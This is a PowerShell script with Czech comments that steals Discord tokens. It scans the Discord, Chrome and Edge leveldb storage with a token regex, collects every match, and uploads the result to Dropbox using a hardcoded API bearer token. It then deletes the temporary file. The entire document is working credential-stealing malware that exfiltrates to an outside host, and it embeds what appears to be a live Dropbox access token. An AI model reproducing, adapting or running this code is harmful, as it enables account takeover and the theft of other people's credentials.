# Cesty, kde se může nacházet Discord token (můžeš přidat další podle potřeby)
$tokenPaths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb\",
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb\",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb\"
)

# Regulární výraz pro vyhledání tokenu
$tokenPattern = '[\w-]{24}\.[\w-]{6}\.[\w-]{27}'
$tokenFound = $false
$tokenData = ""

foreach ($path in $tokenPaths) {
    if (Test-Path $path) {
        $files = Get-ChildItem -Path $path -Filter "*.ldb" -ErrorAction SilentlyContinue
        foreach ($file in $files) {
            $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
            $matches = [regex]::Matches($content, $tokenPattern)
            foreach ($match in $matches) {
                if ($match.Value) {
                    $tokenData += "$($match.Value)`n"
                    $tokenFound = $true
                }
            }
        }
    }
}

if ($tokenFound) {
    # Uložení tokenu do dočasného souboru
    $tempFile = "$env:TEMP\discord_token.txt"
    $tokenData | Out-File -FilePath $tempFile

    # Nastavení parametrů pro Dropbox nahrávání
    # Zde vlož svůj vygenerovaný access token z Dropboxu
    $dropboxAccessToken = "sl.u.AFkNCpZP5uWgYp98JeWaPkLw53sQ-tS-qjRSKeTq73OmrnJw93ztr4PZYxUNvCvyF-fOfdTqHnXMOPAVDRGqbdVTjb2bYjLQMqWDOl_nq6_jPyq4v-0XMbp2NUx1gdZmsVUjxCiBLTNmJCP7hIvSIY7dhWynEuJLxBoXXm8_j7XKVsRyHIu9wPnn_NVXsKrH3-pBhy0wzOszNQG8IEUpMpWuemSWiS16yEifZRzToVIEoWkYkXz8FwgW9T43uACo_R8GC_RqDTFPeS3LL07RfZif51xsyFGPy1qjyFn5J-YK17Io6kT3wj3KsvOO3yVzJqSVnkxvSAFzBkFcfWW2aUxaVdc-M-GZDNJR0NBZHvS_xFDcFm15unc7sz6-NsDDCd0hugD0Vw2Q9zuzWGaH9QIwwrz-vJilCf8ork67JFcCQzseAAUAbNNHKJxW2U32paoUq84P5WgHrSAeFAU6OUBULnqUDuJ6fW4BQ4ljNRq3ikBBETI05a2SPgxW9P42O9CqXi-Id93LpcJdmrsUc9JxG4cg0SV5nbWp1fwCemDW4lTDEEmZuMGGDkpPBgqcjJVqRBCyqOVB0gjUtTWVJCtFIHNOaOWUWQ1TtF77ZP_gfjfpVPDyIY6v88fD6yjsIpFSLA4PPBIXrieGsGR5iHioN8-shWXmKgKmfZADMIhEg5DTbVkecTwEebTpeiFlm_KHP92zAlxQ8k-An_YFfafVp4xKXrTinNNfVfUagr0YpqXIKHN9G-J6zZ_QMG7lXpcLwaFH4ps6EVIYMPb5zKcjGMQws6w3A08y1HUnERwPhS42hIppIwNKoZtTxA-P6_hzQyR4dWrfodHEjgeHaMdCUeBLQbeBWv0Dm3bKl47_Ztl9t9QQi9t82t5VcIxjRAGbyX46iSGL_t-8qOrIxKXc5MJ6JT1JmUIzSZ8X7ppBze0nhQU3csr6ZWbaUAWVtoIUOj-iun-HjAL6k-4pIMm59MQL8igf2klR2Ak0UE3VyJ8c_8fNSlN6HAI8EU0FhTR230EamoZwVvL-2kZ3TJk6oKjSdEafJt5mGZnOupEtmcTwvVeTDVcUY9uMHWd-vvaO3VDx5LKUslCSAXRY4qDVDQPauPe5Cf03JQmphzFxM5jlA2robQjTE_N78C3NOj-j-TctWDyoujZWPndgusiW2FDeuuYxlMgWl7BxrJSdQd705xAbo4z3mz0CVaYyQe_Zb-8j_zOqowE0mPXwqQr5RcXGxB46FDfrG7OC6_hcwUZwHI73B9ZI3vKxp0yFbg6jwFJQGzsZuXo16ZFXdDTx-hnpLe_pAfy75sFr1HdMseWhSEiHqimsVXP0OZQVfvAGOH_nBTcR64Byr4x1dmWekURuBfxkGcKGDjF5MPwo4QgBNJdkRJ1RSioP_o2dBag"
    # Uložení souboru do kořenového adresáře – soubor se jmenuje discord_token.txt
    $dropboxFilePath = "/discord_token.txt"

    $headers = @{
        "Authorization"   = "Bearer $dropboxAccessToken"
        "Content-Type"    = "application/octet-stream"
        "Dropbox-API-Arg" = "{`"path`": `"$dropboxFilePath`", `"mode`": `"overwrite`", `"autorename`": false, `"mute`": false}"
    }

    try {
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -InFile $tempFile
    }
    catch {
        Write-Error "Chyba při nahrávání souboru na Dropbox: $_"
    }

    # Odstranění dočasného souboru
    Remove-Item $tempFile
}

